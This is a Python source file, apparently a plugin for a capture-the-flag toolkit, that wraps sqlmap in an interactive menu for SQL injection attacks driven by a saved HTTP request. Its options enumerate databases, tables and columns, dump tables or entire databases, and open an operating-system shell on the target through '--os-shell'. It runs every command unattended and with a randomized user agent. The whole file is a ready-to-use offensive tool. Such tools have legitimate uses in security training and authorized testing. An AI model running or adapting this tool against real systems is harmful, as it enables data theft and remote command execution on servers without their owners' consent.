import subprocess


PROVIDES = []
REQUIRES = []


def run(data, cred, args):

    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'

    req = getattr(args, "file", None)

    if not req:
        print(f"\n{R}[!] Usage:{W} ctf sqlmap.auto <request.txt>")
        return

    while True:

        print(f"""
{G}[1]{W} Enumerate Databases
{G}[2]{W} Enumerate Tables
{G}[3]{W} Enumerate Columns
{G}[4]{W} Dump Table
{G}[5]{W} Dump Database
{G}[6]{W} OS Shell
{G}[0]{W} Exit
""")

        choice = input("> ").strip()

        if choice == "0":
            return

        elif choice == "1":

            cmd = [
                "sqlmap",
                "-r", req,
                "--dbs",
                "--batch",
                "--random-agent"
            ]

        elif choice == "2":

            db = input(
                "\nDatabase: "
            ).strip()

            cmd = [
                "sqlmap",
                "-r", req,
                "-D", db,
                "--tables",
                "--batch",
                "--random-agent"
            ]

        elif choice == "3":

            db = input(
                "\nDatabase: "
            ).strip()

            table = input(
                "Table: "
            ).strip()

            cmd = [
                "sqlmap",
                "-r", req,
                "-D", db,
                "-T", table,
                "--columns",
                "--batch",
                "--random-agent"
            ]

        elif choice == "4":

            db = input(
                "\nDatabase: "
            ).strip()

            table = input(
                "Table: "
            ).strip()

            cmd = [
                "sqlmap",
                "-r", req,
                "-D", db,
                "-T", table,
                "--dump",
                "--batch",
                "--random-agent"
            ]

        elif choice == "5":

            db = input(
                "\nDatabase: "
            ).strip()

            cmd = [
                "sqlmap",
                "-r", req,
                "-D", db,
                "--dump",
                "--batch",
                "--random-agent"
            ]

        elif choice == "6":

            cmd = [
                "sqlmap",
                "-r", req,
                "--os-shell",
                "--batch",
                "--random-agent"
            ]

        else:
            continue

        print(
            f"\n{B}[{W}{G}*{W}{B}]{W} COMMAND:\n"
        )

        print(
            f"{Y}{' '.join(cmd)}{W}\n"
        )

        subprocess.run(cmd)
